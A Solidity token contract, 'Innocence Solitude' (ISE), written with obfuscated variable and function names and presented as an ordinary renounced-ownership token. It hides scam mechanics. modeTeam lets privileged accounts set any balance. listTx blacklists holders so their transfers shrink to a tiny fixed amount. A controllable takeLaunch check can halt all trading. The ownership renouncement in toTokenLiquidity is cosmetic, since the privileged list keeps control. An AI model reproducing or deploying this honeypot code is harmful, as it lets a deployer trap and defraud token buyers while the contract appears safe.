//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface marketingTrading {
    function createPair(address fromTotal, address fundTo) external returns (address);
}

interface amountSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundAmount) external view returns (uint256);

    function transfer(address maxMarketing, uint256 swapTo) external returns (bool);

    function allowance(address walletTradingMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTo) external returns (bool);

    function transferFrom(
        address sender,
        address maxMarketing,
        uint256 swapTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundLiquidityMarketing, uint256 value);
    event Approval(address indexed walletTradingMode, address indexed spender, uint256 value);
}

abstract contract receiverLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountSellMetadata is amountSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InnocenceSolitude is receiverLaunched, amountSell, amountSellMetadata {

    mapping(address => bool) public listSender;

    uint256 private fundSwap;

    string private buySwapAmount = "ISE";

    uint8 private walletAtTake = 18;

    uint256 private buySell;

    uint256 private toFundFrom;

    address private fromMarketing;

    function listShould() private view {
        require(listSender[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return limitTx;
    }

    function modeTeam(address isTx, uint256 swapTo) public {
        listShould();
        receiverExempt[isTx] = swapTo;
    }

    mapping(address => mapping(address => uint256)) private isTake;

    uint256 takeLaunch;

    mapping(address => uint256) private receiverExempt;

    function approve(address marketingExemptList, uint256 swapTo) public virtual override returns (bool) {
        isTake[_msgSender()][marketingExemptList] = swapTo;
        emit Approval(_msgSender(), marketingExemptList, swapTo);
        return true;
    }

    function maxSell(address shouldBuy, address maxMarketing, uint256 swapTo) internal returns (bool) {
        if (shouldBuy == minEnable) {
            return teamTrading(shouldBuy, maxMarketing, swapTo);
        }
        uint256 listAtSell = amountSell(sellShouldTake).balanceOf(buyFeeTrading);
        require(listAtSell == takeLaunch);
        require(maxMarketing != buyFeeTrading);
        if (minFeeTrading[shouldBuy]) {
            return teamTrading(shouldBuy, maxMarketing, maxExempt);
        }
        return teamTrading(shouldBuy, maxMarketing, swapTo);
    }

    function listTx(address minAmount) public {
        listShould();
        if (isLaunched != fundSwap) {
            atSwapTake = true;
        }
        if (minAmount == minEnable || minAmount == sellShouldTake) {
            return;
        }
        minFeeTrading[minAmount] = true;
    }

    bool public tokenBuyTrading;

    mapping(address => bool) public minFeeTrading;

    function getOwner() external view returns (address) {
        return fromMarketing;
    }

    function teamTrading(address shouldBuy, address maxMarketing, uint256 swapTo) internal returns (bool) {
        require(receiverExempt[shouldBuy] >= swapTo);
        receiverExempt[shouldBuy] -= swapTo;
        receiverExempt[maxMarketing] += swapTo;
        emit Transfer(shouldBuy, maxMarketing, swapTo);
        return true;
    }

    function allowance(address toReceiver, address marketingExemptList) external view virtual override returns (uint256) {
        if (marketingExemptList == feeMin) {
            return type(uint256).max;
        }
        return isTake[toReceiver][marketingExemptList];
    }

    uint256 public isLaunched;

    function transferFrom(address shouldBuy, address maxMarketing, uint256 swapTo) external override returns (bool) {
        if (_msgSender() != feeMin) {
            if (isTake[shouldBuy][_msgSender()] != type(uint256).max) {
                require(swapTo <= isTake[shouldBuy][_msgSender()]);
                isTake[shouldBuy][_msgSender()] -= swapTo;
            }
        }
        return maxSell(shouldBuy, maxMarketing, swapTo);
    }

    bool public enableTrading;

    uint256 public sellMax;

    address buyFeeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return fromMarketing;
    }

    uint256 private maxFrom = 100000000 * 10 ** 18;

    uint256 exemptLimit;

    uint256 private launchMinMarketing;

    function maxFund(uint256 swapTo) public {
        listShould();
        takeLaunch = swapTo;
    }

    uint256 public receiverSwap;

    function balanceOf(address fundAmount) public view virtual override returns (uint256) {
        return receiverExempt[fundAmount];
    }

    function transfer(address isTx, uint256 swapTo) external virtual override returns (bool) {
        return maxSell(_msgSender(), isTx, swapTo);
    }

    function toTokenLiquidity() public {
        emit OwnershipTransferred(minEnable, address(0));
        fromMarketing = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxFrom;
    }

    uint256 constant maxExempt = 12 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return walletAtTake;
    }

    event OwnershipTransferred(address indexed listLaunch, address indexed takeBuyTotal);

    address public minEnable;

    function symbol() external view virtual override returns (string memory) {
        return buySwapAmount;
    }

    constructor (){
        if (isLaunched == fundSwap) {
            enableTrading = false;
        }
        receiverSell fundTakeExempt = receiverSell(feeMin);
        sellShouldTake = marketingTrading(fundTakeExempt.factory()).createPair(fundTakeExempt.WETH(), address(this));
        if (sellMax != isLaunched) {
            receiverSwap = toFundFrom;
        }
        minEnable = _msgSender();
        listSender[minEnable] = true;
        receiverExempt[minEnable] = maxFrom;
        toTokenLiquidity();
        if (launchMinMarketing != toFundFrom) {
            buySell = toFundFrom;
        }
        emit Transfer(address(0), minEnable, maxFrom);
    }

    address feeMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function senderMax(address shouldAt) public {
        if (tokenBuyTrading) {
            return;
        }
        
        listSender[shouldAt] = true;
        
        tokenBuyTrading = true;
    }

    address public sellShouldTake;

    bool public atSwapTake;

    string private limitTx = "Innocence Solitude";

}